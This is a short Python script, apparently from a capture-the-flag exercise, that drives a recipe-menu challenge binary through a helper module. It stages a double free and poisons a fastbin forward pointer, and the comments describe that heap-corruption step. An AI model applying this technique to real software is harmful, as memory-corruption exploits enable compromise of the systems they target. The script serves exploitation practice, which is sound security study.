import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G('god2')
g.add(b'UNIQ777',(b'0',))
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777')
g.rm(b'UNIQ777'); g.rm(b'UNIQ777'); g.sell(b'2'); g.sell(b'3')   # dup, CC->next=0
# add exploit recipes in a pair: MARK (reuses freed UNIQ777 chunk, poisoned) + DUMMY (fresh from top -> fixes MARK->next)
g.add(b'MARK', (b'0',))
g.add(b'DUMMY', (b'0',))
g.cook(b'MARK')            # should work now; dish name "MARK" sets a fastbin[0x40] fd
g.dump('after cook MARK (pair fix)')
g.close()
